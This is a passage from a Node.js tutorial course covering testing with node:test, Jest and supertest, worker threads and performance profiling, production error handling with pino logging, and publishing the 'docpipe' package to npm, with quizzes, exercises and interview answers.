jest.mock("../src/soffice.js");                      // auto-mock a module
const fn = jest.fn().mockResolvedValueOnce("ok");
jest.useFakeTimers(); jest.advanceTimersByTime(5000);
expect(fn).toHaveBeenCalledTimes(1);
```

Jest gives `expect` matchers, snapshot testing, module auto-mocking and rich watch mode; it needs configuration for ESM (`--experimental-vm-modules` or Babel/ts-jest) and is slower to start. Vitest is the ESM-native, Jest-compatible alternative. `node:test` needs nothing installed and handles ESM natively, so it is my default for libraries and CLIs.

### Testing an Express app

```js
import request from "supertest";
import { app } from "../src/app.js";              // app without .listen()
test("GET /health", async () => {
  const res = await request(app).get("/health").expect(200);
  assert.equal(res.body.status, "ok");
});
test("POST /orders validates", async () => {
  await request(app).post("/orders").send({ file_no: "bad" }).expect(422);
});
```

supertest binds the app to an ephemeral port per request and closes it. Keep `app.js` (routes) separate from `server.js` (`listen`) precisely so tests can import the app.

### What to test in a document pipeline

| Layer | Test type | Example |
|---|---|---|
| Pure functions | unit | natural sort, extension census, config parsing |
| File operations | unit with temp dir | batch skips lock files, atomic write leaves no `.tmp` |
| External tools | contract test, skipped when tool absent | `soffice --version` runs; one real conversion produces a PDF starting with `%PDF` |
| HTTP | integration with supertest | status codes, error envelope |
| CLI | end-to-end | `docpipe --help` exit code 0 |

`test.skip` or `{ skip: !hasSoffice }` keeps the suite green on machines without LibreOffice while still running the real thing in CI images that have it.

> **Interview note:** Interviewers ask "how do you test code that calls an external program?" The answer is dependency injection: the batch function takes `convert` as a parameter, unit tests pass a fake, and one contract test exercises the real binary behind a skip guard.

### Try It Yourself

```js
// A tiny test runner with describe/test/assert and a mock.fn, exercising real functions from earlier chapters.
const results = [];
const assert = {
  equal: (a, b, m = "") => { if (a !== b) throw new Error(`${m} expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); },
  deepEqual: (a, b, m = "") => { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(`${m} expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); },
  rejects: async (fn, re) => { try { await fn(); } catch (e) { if (!re.test(e.message)) throw new Error(`rejected with wrong message: ${e.message}`); return; } throw new Error("expected rejection"); },
};
const mockFn = impl => { const f = (...a) => { f.calls.push(a); return impl(...a); }; f.calls = []; return f; };
async function test(name, fn) { try { await fn(); results.push({ name, status: "pass" }); } catch (e) { results.push({ name, status: "FAIL", error: e.message }); } }

// code under test
const naturalSort = arr => [...arr].sort(new Intl.Collator(undefined, { numeric: true, sensitivity: "base" }).compare);
const selectDocs = files => files.filter(f => /\.docx$/i.test(f) && !f.split("/").pop().startsWith("~$"));
async function withRetry(fn, attempts) { for (let i = 1; ; i++) { try { return await fn(); } catch (e) { if (i === attempts) throw e; } } }

(async () => {
  await test("naturalSort orders numerically", () => assert.deepEqual(naturalSort(["Ch 10", "Ch 2", "Ch 1"]), ["Ch 1", "Ch 2", "Ch 10"]));
  await test("selectDocs skips lock files and is case-insensitive", () => assert.deepEqual(selectDocs(["a.DOCX", "~$a.docx", "b.pdf"]), ["a.DOCX"]));
  await test("withRetry succeeds on the third attempt", async () => {
    const run = mockFn(async () => { if (run.calls.length < 3) throw new Error("boom"); return "ok"; });
    assert.equal(await withRetry(run, 3), "ok"); assert.equal(run.calls.length, 3, "call count");
  });
  await test("withRetry gives up after N attempts", () => assert.rejects(() => withRetry(async () => { throw new Error("always fails"); }, 2), /always fails/));
  await test("a deliberately failing test", () => assert.equal(naturalSort(["b", "A"])[0], "b"));
  console.log(results.map(r => `${r.status === "pass" ? "ok" : "not ok"} - ${r.name}${r.error ? "\n    " + r.error : ""}`).join("\n"));
  const passed = results.filter(r => r.status === "pass").length;
  console.log(`\n# tests ${results.length}\n# pass ${passed}\n# fail ${results.length - passed}`);
})();
```

### Quiz

1. Why import `node:assert/strict` instead of `node:assert`?
- [x] The strict version uses `===` and deep strict equality
- [ ] It is faster
- [ ] The non-strict version is deprecated
> `assert.equal(1, "1")` passes in legacy mode, which hides bugs.

2. How does `node --test` find test files by default?
- [ ] Only files listed in package.json
- [x] Patterns such as `**/*.test.js` and files under `test/`
- [ ] Every `.js` file
> You can also pass explicit paths or globs.

3. What is the purpose of `t.mock.timers`?
- [ ] To measure test duration
- [x] To fake `setTimeout`/`Date` so time-based code runs instantly
- [ ] To retry flaky tests
> Advance fake time with `tick()` instead of waiting.

4. Why separate `app.js` from `server.js`?
- [x] So tests can import the app without opening a port
- [ ] Express requires it
- [ ] For faster startup
> supertest binds the app to a temporary port itself.

### Exercises

1. **Temp-dir test** — Write a `node:test` test that creates a temp directory, writes `a.txt`, and asserts `readdir` returns one entry.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { test } from "node:test"; import assert from "node:assert/strict";
import { mkdtemp, writeFile, readdir, rm } from "node:fs/promises"; import { tmpdir } from "node:os"; import path from "node:path";
test("one file", async () => {
  const dir = await mkdtemp(path.join(tmpdir(), "t-"));
  await writeFile(path.join(dir, "a.txt"), "x");
  assert.deepEqual(await readdir(dir), ["a.txt"]);
  await rm(dir, { recursive: true });
});
```

</details>

2. **Skip when tool missing** — Write a test that runs `soffice --version` but is skipped when the binary is not found.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { execFileSync } from "node:child_process";
const hasSoffice = (() => { try { execFileSync("soffice", ["--version"], { stdio: "ignore" }); return true; } catch { return false; } })();
test("soffice is callable", { skip: !hasSoffice && "LibreOffice not installed" }, () => {
  assert.match(execFileSync("soffice", ["--version"]).toString(), /LibreOffice/);
});
```

</details>

3. **Mock method** — Use `mock.method` to replace `console.error` and assert your function logged exactly one error.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { test, mock } from "node:test"; import assert from "node:assert/strict";
test("logs once", () => {
  const spy = mock.method(console, "error", () => {});
  reportFailure("a.docx", new Error("x"));
  assert.equal(spy.mock.callCount(), 1);
  spy.mock.restore();
});
```

</details>

### Interview Questions

**Q: How do you test code that depends on the file system and external tools?**
I separate pure logic from I/O so most tests need neither: the selection, sorting and report-building functions take arrays and return arrays. File-system code runs against a `mkdtemp` directory that the test creates and removes, which is fast and parallel-safe. External tools are injected as functions (`batch(files, { convert })`) so unit tests pass a fake that records calls and can fail on demand; a small number of contract tests call the real `soffice` behind a skip guard so they run in CI images that have it and are skipped elsewhere. This gives a suite that runs in under a second locally while still proving the real integration works somewhere.

**Q: node:test or Jest?**
For libraries, CLIs and services I start with `node:test`: zero dependencies, native ESM, built-in mocking, coverage and watch mode, and TAP or spec output that CI understands. Jest earns its install when a team already knows its matchers, needs snapshot testing, or relies on its module auto-mocking and huge plugin ecosystem, typically in front-end or React projects. Vitest is the middle ground for ESM-heavy TypeScript projects. The choice matters less than the discipline of injecting dependencies and keeping tests fast; I would not fight a team's existing runner.

**Q: What makes a test flaky and how do you fix it?**
Real time (`setTimeout` waits, date comparisons), shared state between tests (a fixed temp path, a global counter), order dependence, network access and unbounded concurrency. Fixes: fake timers for anything time-based, unique temp directories per test, resetting mocks in `beforeEach`, stubbing network calls, and running the flaky test in isolation with `--test-only` to confirm the cause. I treat a flaky test as a bug in the test or the code rather than something to retry, because retries hide real race conditions like the missing backpressure handling we discussed in streams.

# LEVEL: Expert

## Worker threads & performance

Node runs JavaScript on one thread. That is fine while the work is I/O (waiting on disks, LibreOffice, the network) because libuv does the waiting off-thread. It is not fine when the work is CPU: parsing a 767-page PDF's text, hashing 2 GB, rendering 500 Word documents with `docx` in memory. During those seconds the event loop is blocked and every HTTP request, timer and stream stalls. **Worker threads** give you real parallel JavaScript inside one process.

### Measuring first

```js
import { monitorEventLoopDelay } from "node:perf_hooks";
const h = monitorEventLoopDelay({ resolution: 20 });
h.enable();
setInterval(() => console.log("loop p99 delay ms:", (h.percentile(99) / 1e6).toFixed(1)), 5000);
```

If p99 loop delay is tens of milliseconds under load, something synchronous is hogging the thread. `node --cpu-prof app.js` writes a `.cpuprofile` you open in Chrome DevTools (Performance tab) to see which function. `console.time`/`performance.now()` bracket suspects. Optimise what the profile shows, not what you guess.

### Workers versus child processes versus cluster

| Mechanism | Memory | Communication | Best for |
|---|---|---|---|
| `worker_threads` | shared process, optional `SharedArrayBuffer` | `postMessage` (structured clone or transfer) | CPU-bound JS: parsing, hashing, rendering |
| `child_process.fork` | separate process | IPC messages (JSON) | isolation, crash containment, non-Node programs |
| `cluster` / pm2 cluster mode | separate processes sharing one port | IPC | scaling an HTTP server across cores |

Workers start in a few milliseconds and share the heap only through explicit `SharedArrayBuffer`; each has its own V8 isolate and event loop, so a `while(true)` in a worker does not touch the main loop.

### A worker that builds documents

```js
// main.js
import { Worker } from "node:worker_threads";
import { availableParallelism } from "node:os";

function runWorker(job) {
  return new Promise((resolve, reject) => {
    const w = new Worker(new URL("./render-worker.js", import.meta.url), { workerData: job });
    w.once("message", resolve);
    w.once("error", reject);
    w.once("exit", code => code !== 0 && reject(new Error(`worker exited ${code}`)));
  });
}
const jobs = orders.map(o => ({ template: "commitment.docx", data: o }));
const results = await mapLimit(jobs, availableParallelism(), runWorker);
```

```js
// render-worker.js
import { parentPort, workerData } from "node:worker_threads";
import { renderDocx } from "./render.js";           // CPU-heavy: docxtemplater + docx
const bytes = await renderDocx(workerData.template, workerData.data);
parentPort.postMessage({ file: `${workerData.data.file_no}.docx`, bytes }, [bytes.buffer]); // transfer, no copy
```

The second argument to `postMessage` is a transfer list: the `ArrayBuffer` moves to the receiver with zero copy and becomes unusable in the sender. Without it, structured cloning copies every byte.

### Worker pools

Spawning one worker per job wastes the startup cost. Keep a pool of `availableParallelism()` workers alive and dispatch jobs over `postMessage`; the `piscina` package does this well (queues, per-task timeouts, `maxQueue`, idle shutdown), and Node's own docs contain a small pool built on `AsyncResource`. A pool also caps memory: each worker holds one document in flight, not fifty.

### Sharing memory

```js
const shared = new SharedArrayBuffer(4 * 1024);
const counters = new Int32Array(shared);
new Worker("./count.js", { workerData: shared });
// in the worker: Atomics.add(counters, 0, 1)
```

`Atomics` operations are the only safe way to update shared memory from several threads. Use this for progress counters and lock-free queues; keep documents themselves in transferable buffers.

### Common performance wins that are not threads

- Stream instead of buffer (already covered): memory, not CPU, is often the real limit.
- Avoid `JSON.parse` of huge payloads on the main thread; parse in a worker or use a streaming parser.
- Cache compiled templates and regexes; `new RegExp` in a hot loop is measurable.
- Batch database writes in transactions; one `INSERT` per row over the network is the slowest thing in most report generators.
- Keep `--max-old-space-size` in mind: the default heap limit (about 4 GB on 64-bit Node 20+, lower on older versions) is reachable when you hold many `docx` objects at once; the fix is streaming and pooling, not a bigger heap.

### Async hooks and AsyncLocalStorage

`AsyncLocalStorage` carries a context (request id, user) across `await` boundaries without passing it as a parameter, which is how `pino-http` attaches the request id to every log line inside a handler. Store small immutable values; it has a measurable cost in tight loops.

> **Warning:** Workers do not fix I/O-bound slowness. If the batch is waiting on LibreOffice, adding threads adds nothing; raise the child-process concurrency instead. Profile before choosing.

### Try It Yourself

```js
// Web Workers in the browser follow the same postMessage model as node:worker_threads.
// This builds a pool of workers from an inline script, transfers ArrayBuffers, and compares with the main thread.
const workerSrc = `
  self.onmessage = ({ data }) => {
    const bytes = new Uint8Array(data.buffer); let h = 2166136261;          // FNV-1a over the buffer (CPU work)
    for (let r = 0; r < data.rounds; r++) for (let i = 0; i < bytes.length; i++) { h ^= bytes[i]; h = Math.imul(h, 16777619) >>> 0; }
    self.postMessage({ id: data.id, hash: h.toString(16), bytes: bytes.length }, [data.buffer]);   // transfer back
  };`;
const url = URL.createObjectURL(new Blob([workerSrc], { type: "application/javascript" }));
const size = 512 * 1024, rounds = 20, jobs = 8, poolSize = Math.max(1, Math.min(4, navigator.hardwareConcurrency || 2));
const makeJob = id => ({ id, buffer: new Uint8Array(size).map((_, i) => (i * 31 + id) & 255).buffer, rounds });
function hashMain(job) { const b = new Uint8Array(job.buffer); let h = 2166136261; for (let r = 0; r < rounds; r++) for (let i = 0; i < b.length; i++) { h ^= b[i]; h = Math.imul(h, 16777619) >>> 0; } return h.toString(16); }
function pool(n) {
  const workers = Array.from({ length: n }, () => new Worker(url)), idle = [...workers], queue = [];
  const run = job => new Promise(resolve => { queue.push({ job, resolve }); pump(); });
  function pump() { while (idle.length && queue.length) { const w = idle.pop(), { job, resolve } = queue.shift();
    w.onmessage = e => { idle.push(w); resolve(e.data); pump(); }; w.postMessage(job, [job.buffer]); } }
  return { run, close: () => workers.forEach(w => w.terminate()) };
}
(async () => {
  let t0 = performance.now(); const mainHashes = Array.from({ length: jobs }, (_, i) => hashMain(makeJob(i)));
  console.log(`main thread: ${jobs} jobs in ${(performance.now() - t0).toFixed(0)} ms (UI frozen meanwhile)`);
  const p = pool(poolSize); t0 = performance.now();
  const out = await Promise.all(Array.from({ length: jobs }, (_, i) => p.run(makeJob(i))));
  console.log(`${poolSize} workers: ${jobs} jobs in ${(performance.now() - t0).toFixed(0)} ms`);
  console.log("results match:", out.every((r, i) => r.hash === mainHashes[i]), "| sample:", out[0]);
  const probe = makeJob(99); const before = probe.buffer.byteLength; await p.run(probe);
  console.log(`transfer list: buffer was ${before} bytes, after transfer it is ${probe.buffer.byteLength} bytes in the sender`);
  p.close();
})();
```

### Quiz

1. What does a blocked event loop affect?
- [x] Every request, timer and stream in the process
- [ ] Only the current request
- [ ] Only worker threads
> One thread serves all callbacks; a long synchronous task delays all of them.

2. What does passing `[buffer]` as the second argument of `postMessage` do?
- [ ] Copies the buffer twice
- [x] Transfers ownership without copying; the sender's buffer becomes empty
- [ ] Encrypts the buffer
> Transferables avoid structured-clone copies for large binary data.

3. Which is the right tool to scale an Express server across CPU cores?
- [ ] `worker_threads`
- [x] `cluster` or pm2 cluster mode
- [ ] `setImmediate`
> Workers share no port; cluster forks processes that share the listening socket.

4. A batch is slow because it waits on LibreOffice. Will worker threads help?
- [ ] Yes, always
- [x] No, the bottleneck is an external process, not JavaScript CPU
- [ ] Only on Windows
> Increase child-process concurrency instead, and profile to confirm the bottleneck.

### Exercises

1. **Loop delay monitor** — Use `monitorEventLoopDelay` to log the p95 delay every 2 seconds.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { monitorEventLoopDelay } from "node:perf_hooks";
const h = monitorEventLoopDelay(); h.enable();
setInterval(() => { console.log("p95 ms", (h.percentile(95) / 1e6).toFixed(2)); h.reset(); }, 2000);
```

</details>

2. **Worker round trip** — Write `main.js` and `square.js` where the worker returns `n * n` for the `workerData` it receives.
<details><summary>Solution</summary>

```js
// Node-only: run locally
// main.js
import { Worker } from "node:worker_threads";
const w = new Worker(new URL("./square.js", import.meta.url), { workerData: 12 });
w.on("message", console.log);                       // 144
// square.js
import { parentPort, workerData } from "node:worker_threads";
parentPort.postMessage(workerData * workerData);
```

</details>

3. **Shared counter** — Two workers each add 1000 to an `Int32Array` over a `SharedArrayBuffer`; print the final value.
<details><summary>Solution</summary>

```js
// Node-only: run locally
// main.js
import { Worker } from "node:worker_threads";
const sab = new SharedArrayBuffer(4), c = new Int32Array(sab);
await Promise.all([1, 2].map(() => new Promise(r => new Worker(new URL("./inc.js", import.meta.url), { workerData: sab }).on("exit", r))));
console.log(Atomics.load(c, 0));                    // 2000
// inc.js
import { workerData } from "node:worker_threads";
const c = new Int32Array(workerData); for (let i = 0; i < 1000; i++) Atomics.add(c, 0, 1);
```

</details>

### Interview Questions

**Q: Node is single-threaded, so how does it handle CPU-heavy work?**
The JavaScript you write runs on one thread, but libuv already uses a thread pool (default size 4, `UV_THREADPOOL_SIZE`) for file I/O, DNS and `crypto` functions, so those never block the loop. For CPU-heavy JavaScript the options are `worker_threads` (separate V8 isolates in the same process, communicating with `postMessage`, sharing memory through `SharedArrayBuffer` and `Atomics`), child processes for isolation or non-Node tools, and `cluster` to run several copies of a server. In a document service I keep the HTTP process thin and push rendering into a pool of workers sized to `os.availableParallelism()`, transferring the finished buffers back without copying.

**Q: How would you find out why a Node service became slow?**
Measure before touching code: event-loop delay via `monitorEventLoopDelay` or `perf_hooks` tells me if the loop is blocked; `process.memoryUsage()` and heap snapshots tell me if we are near the heap limit and garbage-collecting constantly; `--cpu-prof` or `clinic flame` shows which functions burn CPU; access logs with request ids show whether slowness is uniform or from particular endpoints. The usual culprits, in my experience, are a synchronous parse of a large payload, unbounded concurrency causing memory pressure, or an external tool like LibreOffice being the actual bottleneck while the Node code idles. Each has a different fix, which is why profiling comes first.

**Q: What are the costs of worker threads?**
Each worker is a separate V8 isolate with its own heap and event loop, costing roughly 10 to 30 ms and several megabytes to start, so spawning one per small task loses to doing the task inline; a persistent pool amortises that. Data crosses the boundary by structured clone, which copies, unless you transfer `ArrayBuffer`s or share memory, so passing large object graphs back and forth can erase the gain. Workers cannot share module state or database connections, error handling is by events rather than exceptions, and debugging is harder. They are the right tool when a task is CPU-bound for tens of milliseconds or more, not for I/O and not for tiny computations.

## Error handling & logging in production

In development an error is a red stack trace you read and fix. In production it is a line in a log that must tell someone at 3 a.m. what failed, for which client file, and whether the process is still healthy. This chapter covers the error taxonomy Node needs, the process-level safety nets, and structured logging with **pino**.

### Operational versus programmer errors

An **operational error** is an expected failure of the environment: the file is missing (`ENOENT`), LibreOffice timed out, the database refused the connection, the client sent invalid JSON. Handle it: retry, report, degrade. A **programmer error** is a bug: `undefined is not a function`, a wrong argument type, a forgotten `await`. Do not "handle" it; log it with full context and let the process restart cleanly, because the state after an unknown bug is untrustworthy.

### Custom error classes

```js
export class AppError extends Error {
  constructor(message, { code, status = 500, cause, context } = {}) {
    super(message, { cause });                  // ES2022 `cause` keeps the original error
    this.name = new.target.name;
    Object.assign(this, { code, status, context, isOperational: true });
  }
}
export class ConversionError extends AppError {
  constructor(file, cause) { super(`conversion failed for ${file}`, { code: "CONVERSION_FAILED", status: 502, cause, context: { file } }); }
}
try { await soffice(file); } catch (err) { throw new ConversionError(file, err); }
```

`cause` chains errors so the log shows both "conversion failed for ch3.docx" and the underlying `spawn soffice ENOENT`. `error.code` on Node system errors (`ENOENT`, `EACCES`, `EMFILE`, `ETIMEDOUT`) is the string to branch on, never the message text. Node 16+ also has `AggregateError` from `Promise.any` and `Promise.allSettled` results for batch failures.

### Process-level safety nets

```js
process.on("uncaughtException", (err, origin) => {
  logger.fatal({ err, origin }, "uncaught exception, exiting");
  process.exitCode = 1;
  setTimeout(() => process.exit(1), 1000).unref();      // give the logger time to flush
});
process.on("unhandledRejection", reason => {
  throw reason;                                          // route into uncaughtException handling
});
process.on("SIGTERM", shutdown);                         // from pm2, Docker, Kubernetes
process.on("SIGINT", shutdown);                          // Ctrl+C
process.on("warning", w => logger.warn({ w }, "process warning"));
```

Log, then exit; never keep running after `uncaughtException`. Since Node 15 an unhandled rejection already crashes the process; the handler exists to log it properly first. `shutdown` closes the HTTP server, waits for in-flight conversions with a deadline, closes database pools, flushes logs, and exits; pm2 and Kubernetes send `SIGTERM` and wait a grace period before `SIGKILL`.

### Structured logging with pino

```js
import pino from "pino";
export const logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
  redact: ["req.headers.authorization", "*.password", "config.DATABASE_URL"],
  base: { service: "docpipe", version: pkg.version },
  timestamp: pino.stdTimeFunctions.isoTime,
  transport: process.env.NODE_ENV === "production" ? undefined : { target: "pino-pretty" },
});
logger.info({ file: "ch3.docx", ms: 812, bytes: 190_233 }, "converted");
logger.error({ err, file }, "conversion failed");
```

Output is one JSON object per line: `{"level":30,"time":"...","service":"docpipe","file":"ch3.docx","ms":812,"msg":"converted"}`. Structured fields are queryable in Loki, Elasticsearch, CloudWatch or Datadog; a `console.log` sentence is not. pino serialises `err` (name, message, stack, cause, code) automatically, writes asynchronously so logging does not block, and is an order of magnitude faster than winston. `pino-http` logs every request with a duration and attaches `req.log` (a child logger carrying the request id) so lines from one request correlate.

### What to log at which level

| Level | Use | Example |
|---|---|---|
| fatal | process cannot continue | uncaught exception, config invalid |
| error | operation failed, needs attention | conversion failed after retries |
| warn | degraded but continuing | retrying LibreOffice, deprecated option used |
| info | business events | batch started/finished with counts, server listening |
| debug | developer detail | resolved paths, chosen concurrency |
| trace | everything | each chunk written |

Log once per failure, at the place that handles it, with context (file, order id, request id, attempt number). Logging in every layer that re-throws produces four stack traces for one problem. Never log secrets, full request bodies containing PII, or entire documents.

### Retries with backoff

```js
async function retry(fn, { attempts = 3, base = 200, factor = 2, retryOn = e => e.isOperational } = {}) {
  for (let i = 1; ; i++) {
    try { return await fn(i); }
    catch (err) {
      if (i >= attempts || !retryOn(err)) throw err;
      const delay = base * factor ** (i - 1) * (0.5 + Math.random());   // jitter avoids thundering herds
      logger.warn({ err, attempt: i, delay }, "retrying");
      await new Promise(r => setTimeout(r, delay));
    }
  }
}
```

Retry only operational, transient errors (timeouts, `ECONNRESET`, HTTP 429/503), never validation errors or a corrupt input file. Make the operation idempotent before retrying it.

### Health, metrics, alerts

Expose `/health` (process alive) and `/ready` (dependencies reachable) endpoints for the orchestrator; export counters (conversions, failures, durations) with `prom-client` for Prometheus; alert on error rate and p95 latency, not on individual log lines.

> **Interview note:** "What do you do in `uncaughtException`?" The expected answer is: log with context, stop accepting work, exit with non-zero, and let the process manager restart. Continuing to run is the wrong answer.

### Try It Yourself

```js
// Error taxonomy, cause chains, a pino-style JSON logger with redaction, and retry with jittered backoff.
class AppError extends Error { constructor(msg, { code, status = 500, cause, context, retryable = false } = {}) { super(msg, { cause }); this.name = new.target.name; Object.assign(this, { code, status, context, retryable, isOperational: true }); } }
class ConversionError extends AppError { constructor(file, cause, retryable) { super(`conversion failed for ${file}`, { code: "CONVERSION_FAILED", status: 502, cause, context: { file }, retryable }); } }
const serializeErr = e => e && { type: e.name, message: e.message, code: e.code, cause: e.cause ? serializeErr(e.cause) : undefined };
const LEVELS = { trace: 10, debug: 20, info: 30, warn: 40, error: 50, fatal: 60 };
function createLogger({ level = "info", base = {}, redact = [] } = {}) {
  const out = [];
  const log = lvl => (obj, msg) => {
    if (LEVELS[lvl] < LEVELS[level]) return;
    const rec = { level: LEVELS[lvl], time: new Date().toISOString(), ...base, ...(typeof obj === "string" ? { msg: obj } : { ...obj, msg }) };
    if (rec.err) rec.err = serializeErr(rec.err);
    for (const path of redact) { const [a, b] = path.split("."); if (rec[a] && b in rec[a]) rec[a] = { ...rec[a], [b]: "[Redacted]" }; }
    out.push(rec); console.log(JSON.stringify(rec));
  };
  return Object.assign(Object.fromEntries(Object.keys(LEVELS).map(l => [l, log(l)])), { child: extra => createLogger({ level, base: { ...base, ...extra }, redact }), out });
}
const logger = createLogger({ level: "info", base: { service: "docpipe" }, redact: ["req.authorization"] });
const sleep = ms => new Promise(r => setTimeout(r, ms));
async function retry(fn, { attempts = 3, base = 20, factor = 2 } = {}) {
  for (let i = 1; ; i++) { try { return await fn(i); } catch (err) {
    if (i >= attempts || !err.retryable) throw err;
    const delay = Math.round(base * factor ** (i - 1) * (0.5 + Math.random()));
    logger.warn({ err, attempt: i, delay }, "retrying"); await sleep(delay); } }
}
let calls = 0;
const flakySoffice = async () => { calls++; if (calls < 3) throw Object.assign(new Error("connect ETIMEDOUT"), { code: "ETIMEDOUT" }); return "ch3.pdf"; };
(async () => {
  const reqLog = logger.child({ reqId: "req_7f3a", req: { authorization: "Bearer secret-key" } });
  reqLog.info({ file: "ch3.docx" }, "conversion requested");
  const out = await retry(async () => { try { return await flakySoffice(); } catch (e) { throw new ConversionError("ch3.docx", e, e.code === "ETIMEDOUT"); } });
  reqLog.info({ out, attempts: calls }, "converted");
  try { await retry(async () => { throw new ConversionError("bad.docx", new Error("file is password protected"), false); }); }
  catch (e) { reqLog.error({ err: e }, "giving up"); }
  logger.debug("this is hidden at level info");
  console.log(`records emitted: ${logger.out.length + reqLog.out.length}`);
})();
```

### Quiz

1. Which is an operational error?
- [x] LibreOffice timed out on a file
- [ ] Calling `.map` on undefined
- [ ] A typo in a variable name
> Operational errors come from the environment and should be handled; the others are bugs.

2. What should an `uncaughtException` handler do?
- [ ] Swallow the error and continue serving
- [x] Log with context, then exit so the process manager restarts it
- [ ] Retry the failed request
> After an unknown bug the process state cannot be trusted.

3. Why log JSON lines instead of sentences?
- [ ] JSON is smaller
- [x] Fields are queryable and correlatable in log systems
- [ ] `console.log` cannot print sentences in production
> Structured logs let you filter by `file`, `reqId` or `code` instead of grepping prose.

4. Which errors should be retried?
- [ ] All errors
- [x] Transient operational ones such as timeouts and 503s
- [ ] Validation errors
> Retrying a corrupt input or invalid request wastes time and can duplicate effects.

### Exercises

1. **Error with cause** — Wrap a `readFile` failure in an `AppError` with `code: "MANIFEST_MISSING"` and print the chain.
<details><summary>Solution</summary>

```js
try { throw Object.assign(new Error("ENOENT: no such file"), { code: "ENOENT" }); }
catch (e) { const err = new Error("cannot load manifest", { cause: e }); err.code = "MANIFEST_MISSING"; console.log(err.message, "<-", err.cause.message, err.cause.code); }
```

</details>

2. **Graceful shutdown** — Write `shutdown(signal)` that closes an HTTP server, waits for `inFlight` to reach 0 with a 10 s deadline, and exits.
<details><summary>Solution</summary>

```js
// Node-only: run locally
async function shutdown(signal) {
  logger.info({ signal }, "shutting down");
  server.close();
  const deadline = Date.now() + 10_000;
  while (inFlight > 0 && Date.now() < deadline) await new Promise(r => setTimeout(r, 100));
  await db.end();
  process.exit(inFlight > 0 ? 1 : 0);
}
```

</details>

3. **Backoff table** — Print the delays for 5 attempts with base 200 ms and factor 2 (no jitter).
<details><summary>Solution</summary>

```js
console.log(Array.from({ length: 5 }, (_, i) => 200 * 2 ** i)); // [200, 400, 800, 1600, 3200]
```

</details>

### Interview Questions

**Q: How do you handle errors in a long-running Node service?**
I classify them: operational errors (missing file, timeout, invalid input) are handled where they occur with retries, fallbacks or a clear error response, and logged once with context; programmer errors are logged at fatal level by `uncaughtException`/`unhandledRejection` handlers and the process exits so pm2 or Kubernetes restarts it from a clean state. Custom error classes carry a `code`, an HTTP `status` and a `cause` so the log shows the whole chain. Shutdown is graceful on `SIGTERM`: stop accepting, finish in-flight work with a deadline, close pools, flush logs. The measure of success is that a failure at 3 a.m. can be diagnosed from the log line alone.

**Q: What does good production logging look like?**
Structured JSON lines with a level, timestamp, service name, version and a request or job id on every record, written by a fast asynchronous logger such as pino, with redaction rules for secrets and PII. Business events at info (batch finished: 38 ok, 2 failed), failures at error with the serialised error including cause and code, retries at warn, developer detail at debug and off by default. One log line per failure at the handling site, not one per layer. Logs go to stdout and the platform collects them; the app never manages log files. Alerts come from metrics derived from logs or from `prom-client`, not from someone reading the logs.

**Q: Why is swallowing an unhandled promise rejection dangerous, and what changed in Node 15?**
A rejection nobody awaits or catches is a failure the program has already lost track of: a conversion silently did not happen, a database write was never confirmed. Before Node 15 the runtime only printed a warning, so such bugs hid in production for weeks. Since Node 15 the default is `--unhandled-rejections=throw`, which turns it into an uncaught exception and terminates the process, forcing the bug to be visible. The right response is to make sure every promise is awaited or has a `catch`, use `Promise.allSettled` for batches where partial failure is expected, and keep an `unhandledRejection` handler only to log context before exiting.

## Packaging & publishing to npm

The `docpipe` tool from the Advanced level is useful on your machine. Publishing it lets a client run `npx @aliraza/docpipe convert *.docx` without cloning anything, and lets your other projects depend on the shared pieces. Publishing well means a clean `package.json`, a deliberate public surface, dual CommonJS/ESM support where needed, semantic versions and an automated release.

### package.json fields that matter for a published package

```json
{
  "name": "@aliraza/docpipe",
  "version": "1.2.0",
  "description": "Batch document conversion and checks built on LibreOffice",
  "license": "MIT",
  "type": "module",
  "engines": { "node": ">=20" },
  "bin": { "docpipe": "./bin/docpipe.js" },
  "exports": {
    ".": { "import": "./dist/index.js", "require": "./dist/index.cjs", "types": "./dist/index.d.ts" },
    "./batch": "./dist/batch.js",
    "./package.json": "./package.json"
  },
  "files": ["dist", "bin", "README.md", "LICENSE"],
  "sideEffects": false,
  "repository": { "type": "git", "url": "git+https://github.com/aliraza/docpipe.git" },
  "keywords": ["libreoffice", "docx", "pdf", "cli"],
  "publishConfig": { "access": "public" }
}
```

`exports` replaces `main`: it defines exactly which paths consumers may import and hides everything else (`import "@aliraza/docpipe/src/internal.js"` fails), and its conditions pick the ESM or CJS build per consumer. `files` is an allow-list for the tarball; `.npmignore` is the older deny-list, and `files` wins when present. Scoped packages (`@aliraza/...`) are private by default, hence `publishConfig.access`.

### Dependencies, in the right bucket

- `dependencies`: needed at runtime by consumers (`commander`, `fast-glob`).
- `devDependencies`: build and test only (`tsup`, `typescript`, test runners).
- `peerDependencies`: the consumer must provide it (a plugin for `docx` declares `docx` here so there is one copy).
- `optionalDependencies`: install may fail without breaking (platform-specific binaries).

Keep runtime dependencies few; every one is a security and maintenance surface for your users. Check the tree with `npm ls --omit=dev`.

### Dual CommonJS and ESM

Libraries in 2026 are usually ESM-only if they target Node 20+, but tools like Jest 29 in CJS projects still `require` them. `tsup` (esbuild based) builds both from one source:

```bash
npx tsup src/index.ts --format esm,cjs --dts --clean
```

Test the outputs from both sides: `node -e "import('@aliraza/docpipe').then(m => console.log(Object.keys(m)))"` and `node -e "console.log(Object.keys(require('@aliraza/docpipe')))"`. The "dual package hazard" is real: if a consumer loads both builds, `instanceof` checks between them fail, so keep stateful singletons out of libraries.

### Semantic versioning

`MAJOR.MINOR.PATCH`: breaking change, backwards-compatible feature, backwards-compatible fix. Before 1.0.0 anything goes, which is why `^0.3.0` only accepts patches. Removing an option, changing a default, dropping a Node version and changing the shape of the report JSON are all breaking. Ship a `CHANGELOG.md` (Keep a Changelog format) and mark deprecations for one minor before removing.

### The release checklist

```bash
npm login                                   # once; enable 2FA on the account
npm version minor -m "release %s"           # bumps package.json, commits, tags v1.2.0
npm pack --dry-run                          # lists exactly what the tarball contains
npm publish --provenance --access public    # provenance links the package to the CI build
git push --follow-tags
```

